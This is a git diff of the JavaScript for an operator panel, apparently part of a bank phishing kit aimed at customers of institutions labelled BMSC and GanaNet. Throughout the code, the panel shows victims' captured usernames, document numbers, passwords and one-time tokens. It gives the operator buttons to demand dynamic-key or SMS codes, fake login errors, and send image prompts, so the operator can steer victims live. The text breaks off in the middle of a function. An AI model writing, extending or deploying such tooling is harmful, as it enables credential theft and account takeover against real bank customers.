@@ -1,76 +1,68 @@
 /**
- * BMSC - Panel de Operador
- * Monitoreo de sesiones y validación de credenciales en tiempo real
+ * Panel operador GanaNet.
+ * Cola ordenada de usuarios en espera para enviar GanaPin o Autenticador.
  */
+const LANE_COUNT = 5
 
-const LANE_COUNT = 5;
-const LANE_NAMES = ['Azul', 'Verde', 'Rojo', 'Gris', 'Amarillo'];
-
-let rows = new Map();
-let currentFilter = 'all';
+const emptyState = document.getElementById('emptyState')
+const rowCount = document.getElementById('rowCount')
+const hint = document.getElementById('hint')
+const btnClean = document.getElementById('btnClean')
+const btnExport = document.getElementById('btnExport')
+const audioStatus = document.getElementById('audioStatus')
 let isInitialLoad = true;
-let isSoundMuted = localStorage.getItem('bmsc_sound_muted') === 'true';
 let audioCtx = null;
+let isSoundMuted = localStorage.getItem('isSoundMuted') === 'true';
 
-// DOM Elements
-const tbody = document.getElementById('sessionsTbody');
-const emptyState = document.getElementById('emptyState');
-const statTotal = document.getElementById('statTotal');
-const statOnline = document.getElementById('statOnline');
-const statWaiting = document.getElementById('statWaiting');
-const audioToggle = document.getElementById('audioToggle');
-const btnClean = document.getElementById('btnClean');
-const btnExport = document.getElementById('btnExport');
-const statusIndicator = document.querySelector('.status-indicator');
-const statusText = document.getElementById('statusText');
-const footerNote = document.getElementById('footerNote');
-
-// Counts elements
-const countAll = document.getElementById('countAll');
-const laneCountEls = [
-  document.getElementById('countLane0'),
-  document.getElementById('countLane1'),
-  document.getElementById('countLane2'),
-  document.getElementById('countLane3'),
-  document.getElementById('countLane4')
-];
+/** @type {Map<string, object>} */
+const rows = new Map()
 
 function statusLabel(state) {
-  switch (state) {
-    case 'waiting': return 'En espera';
-    case 'typing': return 'Escribiendo...';
-    case 'waiting-dinamica': return 'Clave Móvil solicitada';
-    case 'waiting-sms': return 'SMS solicitado';
-    case 'received-dinamica': return 'Clave Móvil ingresada';
-    case 'received-sms': return 'SMS ingresado';
-    case 'error-login': return 'Error contraseña';
-    case 'error-dinamica': return 'Error Clave Móvil';
-    case 'error-sms': return 'Error SMS';
-    case 'done': return 'Aprobado / Listo';
-    default: return 'Nuevo';
-  }
+  if (state === 'waiting') return 'En espera'
+  if (state === 'waiting-password') return 'Imagen enviada'
+  if (state === 'password') return 'En contraseña'
+  if (state === 'active') return 'Activo'
+  if (state === 'done') return 'Listo'
+  if (state === 'error-login') return 'Error de datos'
+  if (state === 'error') return 'Error'
+  if (state === 'waiting-dinamica') return 'Dinámica solicitada'
+  if (state === 'waiting-sms') return 'SMS solicitado'
+  if (state === 'received-dinamica') return 'Dinámica'
+  if (state === 'received-sms') return 'SMS'
+  if (state === 'error-dinamica') return 'Error Dinámica'
+  if (state === 'error-sms') return 'Error SMS'
+  if (state === 'typing') return 'Escribiendo código'
+  return 'Nuevo'
 }
 
 function badgeClass(state) {
-  switch (state) {
-    case 'waiting':
-    case 'waiting-dinamica':
-    case 'waiting-sms':
-      return 'badge badge--wait';
-    case 'typing':
-      return 'badge badge--typing';
-    case 'received-dinamica':
-    case 'received-sms':
-      return 'badge badge--token';
-    case 'done':
-      return 'badge badge--done';
-    case 'error-login':
-    case 'error-dinamica':
-    case 'error-sms':
-      return 'badge badge--error';
-    default:
-      return 'badge badge--wait';
+  if (state === 'password' || state === 'waiting-password') {
+    return 'badge badge--wait'
   }
+  if (state === 'typing') {
+    return 'badge badge--typing'
+  }
+  if (
+    state === 'waiting' ||
+    state === 'waiting-dinamica' ||
+    state === 'waiting-sms'
+  ) {
+    return 'badge badge--wait'
+  }
+  if (state === 'active') return 'badge badge--hola'
+  if (state === 'done') return 'badge badge--done'
+  if (state === 'received-dinamica' || state === 'received-sms') {
+    return 'badge badge--login'
+  }
+  if (
+    state === 'error-login' ||
+    state === 'error-dinamica' ||
+    state === 'error-sms' ||
+    state === 'error'
+  ) {
+    return 'badge badge--error'
+  }
+  return 'badge badge--login'
 }
 
 function formatTime(ts) {
@@ -79,90 +71,56 @@ function formatTime(ts) {
       hour: 'numeric',
       minute: '2-digit',
       second: '2-digit',
-      hour12: true
-    });
+      hour12: true,
+    })
   } catch (_) {
-    return '—';
+    return '—'
   }
 }
 
 function laneForIndex(index) {
-  return ((Number(index) || 1) - 1) % LANE_COUNT;
+  return ((Number(index) || 1) - 1) % LANE_COUNT
+}
+
+function getLaneBody(lane) {
+  return document.querySelector(`[data-lane-body="${lane}"]`)
 }
 
 function getDeviceIcon(device) {
   if (device === 'mobile') {
-    return `<span style="display:inline-flex;align-items:center;gap:4px;color:#f97316;" title="Teléfono celular">📱 Móvil</span>`;
+    return `
+      <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="Celular">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#d96500;">
+          <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+          <line x1="12" y1="18" x2="12.01" y2="18"></line>
+        </svg>
+        Celular
+      </span>
+    `
   }
-  return `<span style="display:inline-flex;align-items:center;gap:4px;color:#38bdf8;" title="Computadora de escritorio">💻 PC</span>`;
+  return `
+    <span style="display:inline-flex; align-items:center; gap:6px; font-weight:600; color:#555;" title="PC">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="color:#0b5ed7;">
+        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
+        <line x1="8" y1="21" x2="16" y2="21"></line>
+        <line x1="12" y1="17" x2="12" y2="21"></line>
+      </svg>
+      PC
+    </span>
+  `
 }
 
-// Audio System (Web Audio API)
-function initAudio() {
-  try {
-    if (!audioCtx) {
-      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    }
-    if (audioCtx.state === 'suspended') {
-      audioCtx.resume();
-    }
-  } catch (_) {}
+function isOnline(row) {
+  return !!row.online;
 }
 
-function updateAudioUI() {
-  if (isSoundMuted) {
-    audioToggle.textContent = '🔇 Sonido: OFF';
-    audioToggle.classList.add('is-muted');
-  } else {
-    audioToggle.textContent = '🔊 Sonido: ON';
-    audioToggle.classList.remove('is-muted');
-  }
-}
-
-function playNotificationSound() {
-  if (isSoundMuted) return;
-  try {
-    initAudio();
-    if (!audioCtx || audioCtx.state === 'suspended') return;
-
-    const now = audioCtx.currentTime;
-    const frequencies = [659.25, 880]; // E5, A5 chime
-    frequencies.forEach((freq, idx) => {
-      const osc = audioCtx.createOscillator();
-      const gain = audioCtx.createGain();
-      osc.connect(gain);
-      gain.connect(audioCtx.destination);
-      osc.type = 'triangle';
-      osc.frequency.setValueAtTime(freq, now + idx * 0.1);
-      gain.gain.setValueAtTime(0.3, now + idx * 0.1);
-      gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.1 + 0.3);
-      osc.start(now + idx * 0.1);
-      osc.stop(now + idx * 0.1 + 0.3);
-    });
-  } catch (_) {}
-}
-
-audioToggle.addEventListener('click', (e) => {
-  e.preventDefault();
-  isSoundMuted = !isSoundMuted;
-  localStorage.setItem('bmsc_sound_muted', isSoundMuted ? 'true' : 'false');
-  updateAudioUI();
-  if (!isSoundMuted) {
-    initAudio();
-    playNotificationSound();
-  }
-});
-
-window.addEventListener('click', initAudio, { once: true });
-
-async function setRowAction(rowId, action, state) {
-  const row = rows.get(rowId);
-  if (!row) return;
-  row.state = state || row.state;
-  row.action = action;
-  row.last_seen = Date.now();
-  row.updatedAt = Date.now();
-  footerNote.textContent = `Sesión #${row.index} (${row.user}) → ${statusLabel(row.state)}`;
+async function setRowState(rowId, state, action) {
+  const row = rows.get(rowId)
+  if (!row) return
+  row.state = state
+  row.last_seen = Date.now()
+  row.updatedAt = Date.now()
+  hint.textContent = `${row.user || rowId} → ${statusLabel(state)}`
 
   try {
     await fetch(`/api/sessions/${rowId}/action`, {
@@ -171,281 +129,624 @@ async function setRowAction(rowId, action, state) {
       body: JSON.stringify({ action, state })
     });
   } catch (_) {}
-  render();
+  render()
 }
 
-function createRowElement(row) {
-  const tr = document.createElement('tr');
-  tr.dataset.rowId = row.id;
-  const laneIdx = laneForIndex(row.index);
+async function sendPasswordActionWithImage(rowId, dataUrl) {
+  const row = rows.get(rowId)
+  if (!row) return
 
+  if (dataUrl) {
+    row.customImage = dataUrl
+    try {
+      await fetch(`/api/sessions/${rowId}/image`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataUrl })
+      })
+    } catch (_) {}
+  }
+
+  row.state = 'waiting-password'
+  row.last_seen = Date.now()
+  row.updatedAt = Date.now()
+  hint.textContent = `${row.user || rowId} → Imagen enviada / Esperando contraseña`
+
+  try {
+    await fetch(`/api/sessions/${rowId}/action`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ action: 'password', state: 'waiting-password' })
+    })
+  } catch (_) {}
+  render()
+}
+
+function createRow(row) {
+  const tr = document.createElement('tr')
+  tr.dataset.rowId = row.id
   tr.innerHTML = `
-    <td class="col-num mono font-bold">#${row.index}</td>
-    <td class="col-time mono text-muted">${formatTime(row.createdAt)}</td>
-    <td class="col-lane">
-      <span class="lane-tag lane-tag--${laneIdx}">${LANE_NAMES[laneIdx]}</span>
-    </td>
-    <td class="col-device">${getDeviceIcon(row.device)}</td>
-    <td class="col-ip mono text-muted">${row.ip || '—'}</td>
-    <td class="col-user">
-      <span class="copy-box col-user-val" data-copy="${row.user}">${row.user}</span>
-    </td>
-    <td class="col-pass">
-      <span class="copy-box col-pass-val" data-copy="${row.clave}">${row.clave}</span>
-    </td>
-    <td class="col-token">
-      <span class="copy-box col-token-val ${row.token ? 'token-highlight' : ''}" data-copy="${row.token || ''}">
-        ${row.token || '—'}
-      </span>
-    </td>
+    <td class="col-num"></td>
+    <td class="col-time mono"></td>
+    <td class="col-tipo mono"></td>
+    <td class="col-device"></td>
+    <td class="col-ip mono"></td>
+    <td class="col-user mono"></td>
+    <td class="col-pass mono copyable" title="Copiar clave"></td>
+    <td class="col-token mono copyable" title="Copiar token"></td>
     <td class="col-online"></td>
     <td class="col-status"></td>
     <td>
       <div class="row-actions">
-        <button type="button" class="act-btn act-btn--movil" data-action="dinamica" title="Solicitar Clave Móvil">Clave Móvil</button>
-        <button type="button" class="act-btn act-btn--sms" data-action="sms" title="Solicitar código SMS">SMS</button>
-        <button type="button" class="act-btn act-btn--err-pass" data-action="error-login" title="Notificar contraseña incorrecta">Err Clave</button>
-        <button type="button" class="act-btn act-btn--err-token" data-action="error-dinamica" title="Notificar código incorrecto">Err Código</button>
-        <button type="button" class="act-btn act-btn--done" data-action="done" title="Aprobar acceso">Aprobar</button>
+        <div class="row-img-wrapper" data-img-wrapper>
+          <input type="file" class="row-file-input" accept="image/*" style="display:none;" />
+          <button type="button" class="btn btn--img" data-action="pedir-password" title="Arrastra una imagen aquí o haz clic para subir y pedir contraseña">
+            🖼️ Imagen
+          </button>
+          <div class="row-img-thumb-box" style="display:none;">
+            <img src="" class="img-thumb-preview" alt="Preview" title="Imagen asignada - Clic para cambiar" />
+            <button type="button" class="btn-remove-img" data-action="remove-img" title="Quitar imagen">✕</button>
+          </div>
+        </div>
+        <button type="button" class="btn btn--warning" data-action="error-login">Err Clave</button>
+        <button type="button" class="btn btn--ok" data-action="dinamica">Dinámica</button>
+        <button type="button" class="btn btn--ok" data-action="sms">SMS</button>
+        <button type="button" class="btn btn--error" data-action="error-dinamica">Err Dinámica</button>
+        <button type="button" class="btn btn--error" data-action="error-sms">Err SMS</button>
+        <button type="button" class="btn btn--done" data-action="done">Listo</button>
       </div>
     </td>
-  `;
+  `
 
-  // Action button clicks
-  tr.querySelector('[data-action="dinamica"]').addEventListener('click', () => {
-    setRowAction(row.id, 'dinamica', 'waiting-dinamica');
-  });
-  tr.querySelector('[data-action="sms"]').addEventListener('click', () => {
-    setRowAction(row.id, 'sms', 'waiting-sms');
-  });
-  tr.querySelector('[data-action="error-login"]').addEventListener('click', () => {
-    setRowAction(row.id, 'error-login', 'error-login');
-  });
-  tr.querySelector('[data-action="error-dinamica"]').addEventListener('click', () => {
-    setRowAction(row.id, 'error-dinamica', 'error-dinamica');
-  });
-  tr.querySelector('[data-action="done"]').addEventListener('click', () => {
-    setRowAction(row.id, 'done', 'done');
-  });
+  tr.querySelector('[data-action="dinamica"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-dinamica') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
+    setRowState(row.id, 'waiting-dinamica', 'dinamica')
+  })
+  tr.querySelector('[data-action="sms"]')?.addEventListener('click', () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-sms') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
+    setRowState(row.id, 'waiting-sms', 'sms')
+  })
+  tr.querySelector('[data-action="error-login"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-login', 'error-login')
+    playErrorSound()
+  })
+  tr.querySelector('[data-action="error-dinamica"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-dinamica', 'error-dinamica')
+    playErrorSound()
+  })
+  tr.querySelector('[data-action="error-sms"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'error-sms', 'error-sms')
+    playErrorSound()
+  })
+  tr.querySelector('[data-action="done"]')?.addEventListener('click', () => {
+    setRowState(row.id, 'done', 'done')
+    playSuccessSound()
+  })
 
-  // Copy click listeners
-  tr.querySelectorAll('.copy-box').forEach(box => {
-    box.addEventListener('click', async (e) => {
-      e.stopPropagation();
-      const val = box.dataset.copy;
-      if (!val || val === '—') return;
+  // Image upload and drag-and-drop listeners for this row
+  const fileInput = tr.querySelector('.row-file-input')
+  const imgBtn = tr.querySelector('[data-action="pedir-password"]')
+  const thumbImg = tr.querySelector('.img-thumb-preview')
+  const removeBtn = tr.querySelector('[data-action="remove-img"]')
+
+  imgBtn?.addEventListener('click', async () => {
+    const current = rows.get(row.id)
+    if (current?.state === 'waiting-password') {
+      setRowState(row.id, 'waiting', null)
+      return
+    }
+    if (current?.customImage) {
+      await sendPasswordActionWithImage(row.id, current.customImage)
+    } else {
+      fileInput?.click()
+    }
+  })
+
+  thumbImg?.addEventListener('click', (e) => {
+    e.stopPropagation()
+    fileInput?.click()
+  })
+
+  removeBtn?.addEventListener('click', async (e) => {
+    e.stopPropagation()
+    const current = rows.get(row.id)
+    if (current) current.customImage = null
+    try {
+      await fetch(`/api/sessions/${row.id}/image`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: null })
+      })
+    } catch (_) {}
+    render()
+  })
+
+  fileInput?.addEventListener('change', async () => {
+    const file = fileInput.files?.[0]
+    if (file) {
       try {
-        await navigator.clipboard.writeText(val);
-        box.classList.add('copied');
-        setTimeout(() => box.classList.remove('copied'), 1000);
-      } catch (_) {}
-    });
-  });
+        const dataUrl = await processImageFile(file)
+        await sendPasswordActionWithImage(row.id, dataUrl)
+      } catch (err) {
+        alert(err.message || 'Error al procesar la imagen')
+      }
+    }
+    fileInput.value = ''
+  })
 
-  return tr;
+  const handleDragOver = (e) => {
+    if (e.dataTransfer && e.dataTransfer.types && [...e.dataTransfer.types].includes('Files')) {
+      e.preventDefault()
+      e.stopPropagation()
+      imgBtn?.classList.add('drag-over')
+      tr.classList.add('row-drag-over')
+    }
+  }
+
+  const handleDragLeave = (e) => {
+    e.preventDefault()
+    e.stopPropagation()
+    imgBtn?.classList.remove('drag-over')
+    tr.classList.remove('row-drag-over')
+  }
+
+  const handleDrop = async (e) => {
+    e.preventDefault()
+    e.stopPropagation()
+    imgBtn?.classList.remove('drag-over')
+    tr.classList.remove('row-drag-over')
+    const file = e.dataTransfer?.files?.[0]
+    if (file && file.type.startsWith('image/')) {
+      try {
+        const dataUrl = await processImageFile(file)
+        await sendPasswordActionWithImage(row.id, dataUrl)
+      } catch (err) {
+        alert(err.message || 'Error al procesar la imagen')
+      }
+    }
+  }
+
+  imgBtn?.addEventListener('dragover', handleDragOver)
+  imgBtn?.addEventListener('dragleave', handleDragLeave)
+  imgBtn?.addEventListener('drop', handleDrop)
+
+  tr.addEventListener('dragover', handleDragOver)
+  tr.addEventListener('dragleave', handleDragLeave)
+  tr.addEventListener('drop', handleDrop)
+
+  tr.querySelectorAll('td.copyable').forEach((td) => {
+    td.addEventListener('click', async () => {
+      const text = td.textContent?.trim()
+      if (!text || text === '—') return
+      try {
+        await navigator.clipboard.writeText(text)
+        td.classList.add('copied')
+        setTimeout(() => td.classList.remove('copied'), 900)
+      } catch (_) {
+        /* ignore */
+      }
+    })
+  })
+
+  tr.querySelector('.col-user').addEventListener('click', async (event) => {
+    const pill = event.target.closest('.copy-subpill')
+    if (!pill) return
+    const val = pill.dataset.val
+    if (!val || val === '—') return
+    try {
+      await navigator.clipboard.writeText(val)
+      pill.classList.add('copied')
+      setTimeout(() => pill.classList.remove('copied'), 900)
+    } catch (_) {}
+  })
+
+  return tr
 }
 
-function updateRowElement(tr, row) {
-  const laneIdx = laneForIndex(row.index);
-  tr.querySelector('.col-num').textContent = `#${row.index}`;
-  tr.querySelector('.col-time').textContent = formatTime(row.createdAt);
-  
-  const laneTag = tr.querySelector('.lane-tag');
-  laneTag.className = `lane-tag lane-tag--${laneIdx}`;
-  laneTag.textContent = LANE_NAMES[laneIdx];
-  
-  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device);
-  tr.querySelector('.col-ip').textContent = row.ip || '—';
-  
-  const userBox = tr.querySelector('.col-user-val');
-  userBox.textContent = row.user;
-  userBox.dataset.copy = row.user;
-  
-  const passBox = tr.querySelector('.col-pass-val');
-  passBox.textContent = row.clave;
-  passBox.dataset.copy = row.clave;
-  
-  const tokenBox = tr.querySelector('.col-token-val');
-  tokenBox.textContent = row.token || '—';
-  tokenBox.dataset.copy = row.token || '';
-  tokenBox.classList.toggle('token-highlight', !!row.token);
+function updateRow(tr, row) {
+  const online = isOnline(row)
+  tr.querySelector('.col-num').textContent = String(row.index)
+  tr.querySelector('.col-time').textContent = formatTime(row.createdAt)
+  tr.querySelector('.col-tipo').textContent = row.tipo
+  tr.querySelector('.col-device').innerHTML = getDeviceIcon(row.device)
+  tr.querySelector('.col-ip').textContent = row.ip || '—'
+  const userCell = tr.querySelector('.col-user')
+  const userStr = row.user || '—'
+  if (userStr.includes(' / ')) {
+    const parts = userStr.split(' / ')
+    const docPart = parts[0]
+    const namePart = parts[1]
+    let docNum = docPart
+    if (docPart.includes(':')) {
+      docNum = docPart.split(':')[1]
+    }
+    userCell.innerHTML = `
+      <span class="copy-subpill" data-val="${docNum}" title="Copiar Documento (${docPart})">${docPart}</span>
+      <span class="subpill-divider">/</span>
+      <span class="copy-subpill" data-val="${namePart}" title="Copiar Usuario">${namePart}</span>
+    `
+  } else {
+    userCell.innerHTML = `<span class="copy-subpill" data-val="${userStr}">${userStr}</span>`
+  }
+  tr.querySelector('.col-pass').textContent = row.clave || '—'
+  tr.querySelector('.col-token').textContent = row.token || '—'
+  tr.querySelector('.col-online').innerHTML = online
+    ? '<span class="pill pill--online">En línea</span>'
+    : '<span class="pill pill--offline">Off</span>'
+  tr.querySelector('.col-status').innerHTML =
+    `<span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>`
 
-  tr.querySelector('.col-online').innerHTML = row.online
-    ? '<span class="pill pill--online">● En línea</span>'
-    : '<span class="pill pill--offline">○ Off</span>';
+  const dinamicaBtn = tr.querySelector('[data-action="dinamica"]')
+  const smsBtn = tr.querySelector('[data-action="sms"]')
+  const imgBtn = tr.querySelector('[data-action="pedir-password"]')
+  const thumbBox = tr.querySelector('.row-img-thumb-box')
+  const thumbImg = tr.querySelector('.img-thumb-preview')
 
-  tr.querySelector('.col-status').innerHTML = `
-    <span class="${badgeClass(row.state)}">${statusLabel(row.state)}</span>
-  `;
+  dinamicaBtn?.classList.toggle('is-on', row.state === 'waiting-dinamica')
+  smsBtn?.classList.toggle('is-on', row.state === 'waiting-sms')
+  imgBtn?.classList.toggle('is-on', row.state === 'waiting-password')
+  tr.classList.toggle('is-waiting', row.state === 'waiting')
 
-  // Active state on action buttons
-  const btnMovil = tr.querySelector('[data-action="dinamica"]');
-  const btnSms = tr.querySelector('[data-action="sms"]');
-  btnMovil?.classList.toggle('is-active', row.state === 'waiting-dinamica');
-  btnSms?.classList.toggle('is-active', row.state === 'waiting-sms');
+  if (row.customImage) {
+    if (thumbImg) thumbImg.src = row.customImage
+    if (thumbBox) thumbBox.style.display = 'inline-flex'
+    if (imgBtn) {
+      imgBtn.innerHTML = '🖼️ Imagen ✓'
+      imgBtn.title = 'Imagen lista. Clic para enviar acción o arrastra otra imagen para cambiarla'
+    }
+  } else {
+    if (thumbBox) thumbBox.style.display = 'none'
+    if (imgBtn) {
+      imgBtn.innerHTML = '🖼️ Imagen'
+      imgBtn.title = 'Arrastra una imagen aquí o haz clic para subirla y pedir contraseña'
+    }
+  }
 }
 
 function render() {
-  const list = [...rows.values()].sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
-  
-  statTotal.textContent = String(list.length);
-  statOnline.textContent = String(list.filter(s => s.online).length);
-  statWaiting.textContent = String(list.filter(s => s.state === 'waiting' || s.state === 'waiting-dinamica' || s.state === 'waiting-sms').length);
-  
-  countAll.textContent = String(list.length);
-  const laneCounts = [0, 0, 0, 0, 0];
-  list.forEach(s => {
-    laneCounts[laneForIndex(s.index)]++;
-  });
-  laneCounts.forEach((c, idx) => {
-    if (laneCountEls[idx]) laneCountEls[idx].textContent = String(c);
-  });
+  const list = [...rows.values()].sort((a, b) => (a.createdAt || 0) - (b.createdAt || 0))
+  list.forEach((row, i) => {
+    row.index = i + 1
+  })
+  rowCount.textContent = String(list.length)
+  emptyState.classList.toggle('is-visible', list.length === 0)
 
-  const filtered = currentFilter === 'all'
-    ? list
-    : list.filter(s => String(laneForIndex(s.index)) === currentFilter);
+  const byLane = Array.from({ length: LANE_COUNT }, () => [])
+  list.forEach((row) => {
+    byLane[laneForIndex(row.index)].push(row)
+  })
 
-  emptyState.classList.toggle('is-visible', filtered.length === 0);
+  for (let lane = 0; lane < LANE_COUNT; lane += 1) {
+    const body = getLaneBody(lane)
+    if (!body) continue
+    const laneEl = document.querySelector(`[data-lane="${lane}"]`)
+    const countEl = laneEl?.querySelector('[data-lane-count]')
+    const laneRows = byLane[lane]
+    if (countEl) countEl.textContent = String(laneRows.length)
 
-  // Remove rows no longer present or filtered out
-  [...tbody.querySelectorAll('tr[data-row-id]')].forEach(tr => {
-    const id = tr.dataset.rowId;
-    const item = filtered.find(s => s.id === id);
-    if (!item) tr.remove();
-  });
+    ;[...body.querySelectorAll('tr[data-row-id]')].forEach((tr) => {
+      const row = rows.get(tr.dataset.rowId);
+      if (!row || laneForIndex(row.index) !== lane) {
+        tr.remove();
+      }
+    })
 
-  // Add or update rows
-  filtered.forEach(row => {
-    let tr = tbody.querySelector(`tr[data-row-id="${row.id}"]`);
-    if (!tr) {
-      tr = createRowElement(row);
-      tbody.appendChild(tr);
-    }
-    updateRowElement(tr, row);
-  });
+    laneRows.forEach((row) => {
+      let tr = [...body.querySelectorAll('tr[data-row-id]')].find(
+        (node) => node.dataset.rowId === row.id,
+      )
+      if (!tr) {
+        tr = createRow(row)
+        body.appendChild(tr)
+      }
+      updateRow(tr, row)
+    })
+  }
 }
 
-// Filter tabs listener
-document.querySelectorAll('.lane-tab').forEach(tab => {
-  tab.addEventListener('click', () => {
-    document.querySelectorAll('.lane-tab').forEach(t => t.classList.remove('is-active'));
-    tab.classList.add('is-active');
-    currentFilter = tab.dataset.filter;
-    render();
-  });
-});
-
-// Polling
 async function pollSessions() {
   try {
     const response = await fetch('/api/sessions');
     if (response.ok) {
-      statusIndicator.className = 'status-indicator live';
-      statusText.textContent = 'En vivo';
-      
       const list = await response.json();
+      
+      // Track existing new entries BEFORE clearing the map
       const oldKeys = new Set(rows.keys());
-      let hasAlert = false;
-
-      list.forEach(session => {
+      let hasNewOrChangedSession = false;
+      
+      list.forEach((session) => {
         if (!oldKeys.has(session.id)) {
-          hasAlert = true;
+          hasNewOrChangedSession = true;
+          requestAnimationFrame(() => {
+            const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
+            if (!tr) return
+            tr.classList.add('is-new')
+            setTimeout(() => tr.classList.remove('is-new'), 1800)
+          })
         } else {
-          const old = rows.get(session.id);
-          if (old && (old.state !== session.state || old.token !== session.token)) {
-            hasAlert = true;
+          // Compare with stored session BEFORE overwriting it
+          const oldSession = rows.get(session.id);
+          if (oldSession && oldSession.state !== session.state) {
+            // Trigger sound on any relevant state changes
+            if (
+              session.state === 'waiting' ||
+              session.state === 'waiting-password' ||
+              session.state === 'password' ||
+              session.state === 'received-dinamica' ||
+              session.state === 'received-sms' ||
+              session.state === 'error-login' ||
+              session.state === 'error-dinamica' ||
+              session.state === 'error-sms' ||
+              session.state === 'done'
+            ) {
+              hasNewOrChangedSession = true;
+            }
           }
         }
       });
 
+      // Clear and rebuild map
       rows.clear();
-      list.forEach(s => {
-        rows.set(s.id, {
-          id: s.id,
-          index: s.index,
-          createdAt: s.createdAt,
-          updatedAt: s.updatedAt,
-          last_seen: s.last_seen,
-          tipo: s.tipoUsuario || 'Banca por Internet',
-          device: s.device || 'desktop',
-          ip: s.ip || '127.0.0.1',
-          user: s.username || '—',
-          clave: s.password || '—',
-          token: s.token || '',
-          state: s.state || 'waiting',
-          action: s.action,
-          online: s.online
+      list.forEach((session) => {
+        rows.set(session.id, {
+          id: session.id,
+          index: session.index,
+          createdAt: session.createdAt,
+          updatedAt: session.updatedAt,
+          last_seen: session.last_seen,
+          tipo: session.tipoUsuario || session.tipo || 'Banca por Internet',
+          device: session.device || 'desktop',
+          ip: session.ip || '127.0.0.1',
+          user: session.username || session.user || '—',
+          clave: session.password || session.clave || '—',
+          token: session.token || '',
+          state: session.state || 'waiting',
+          customImage: session.customImage || null,
+          online: session.online
         });
       });
-
       render();
 
-      if (hasAlert && !isInitialLoad) {
+      if (hasNewOrChangedSession && !isInitialLoad) {
         playNotificationSound();
       }
-    } else {
-      statusIndicator.className = 'status-indicator offline';
-      statusText.textContent = 'Error API';
     }
-  } catch (err) {
-    statusIndicator.className = 'status-indicator offline';
-    statusText.textContent = 'Desconectado';
+  } catch (_) {}
+}
+
+function initAudio() {
+  try {
+    if (!audioCtx) {
+      audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    }
+    if (audioCtx.state === 'suspended') {
+      audioCtx.resume().then(updateAudioUI);
+    } else {
+      updateAudioUI();
+    }
+  } catch (_) {}
+}
+
+function updateAudioUI() {
+  if (!audioStatus) return;
+  if (isSoundMuted) {
+    audioStatus.textContent = '🔇 Sonido: OFF';
+    audioStatus.style.color = '#f44336';
+    audioStatus.style.borderColor = '#f44336';
+    audioStatus.style.background = '#ffebee';
+  } else {
+    audioStatus.textContent = '🔊 Sonido: ON';
+    audioStatus.style.color = '#4caf50';
+    audioStatus.style.borderColor = '#4caf50';
+    audioStatus.style.background = '#e8f5e9';
   }
 }
 
-// Clean queue
+// Audio status toggle listener
+audioStatus?.addEventListener('click', (event) => {
+  event.preventDefault();
+  event.stopPropagation();
+  isSoundMuted = !isSoundMuted;
+  localStorage.setItem('isSoundMuted', isSoundMuted ? 'true' : 'false');
+  updateAudioUI();
+  if (!isSoundMuted) initAudio();
+});
+
+window.addEventListener('click', initAudio, { once: true });
+window.addEventListener('touchstart', initAudio, { once: true });
+
+updateAudioUI();
+
+function playNotificationSound() {
+  if (isSoundMuted) return;
+  try {
+    initAudio(); // Ensure context is initialized
+    if (!audioCtx || audioCtx.state === 'suspended') {
+      console.warn("AudioContext is suspended or blocked. Please click anywhere on the page first.");
+      return;
+    }
+
+    const now = audioCtx.currentTime;
+    const frequencies = [587.33, 880]; // D5, A5
+    frequencies.forEach((freq, idx) => {
+      const osc = audioCtx.createOscillator();
+      const gainNode = audioCtx.createGain();
+      osc.connect(gainNode);
+      gainNode.connect(audioCtx.destination);
+      osc.type = 'triangle';
+      osc.frequency.setValueAtTime(freq, now + idx * 0.08);
+      gainNode.gain.setValueAtTime(0.85, now + idx * 0.08);
+      gainNode.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.08 + 0.25);
+      osc.start(now + idx * 0.08);
+      osc.stop(now + idx * 0.08 + 0.25);
+    });
+  } catch (e) {
+    console.error("No se pudo reproducir el sonido:", e);
+  }
+}
+
+function playSuccessSound() {
+  if (isSoundMuted) return;
+  try {
+    initAudio();
+    if (!audioCtx || audioCtx.state === 'suspended') return;
+    
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    
+    osc.type = 'sine';
+    osc.frequency.setValueAtTime(659.25, audioCtx.currentTime); // E5
+    osc.frequency.setValueAtTime(880, audioCtx.currentTime + 0.08); // A5
+    
+    gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+    
+    osc.start();
+    osc.stop(audioCtx.currentTime + 0.35);
+  } catch (_) {}
+}
+
+function playErrorSound() {
+  if (isSoundMuted) return;
+  try {
+    initAudio();
+    if (!audioCtx || audioCtx.state === 'suspended') return;
+    
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.connect(gain);
+    gain.connect(audioCtx.destination);
+    
+    osc.type = 'triangle';
+    osc.frequency.setValueAtTime(220, audioCtx.currentTime);
+    osc.frequency.setValueAtTime(165, audioCtx.currentTime + 0.12);
+    
+    gain.gain.setValueAtTime(0.35, audioCtx.currentTime);
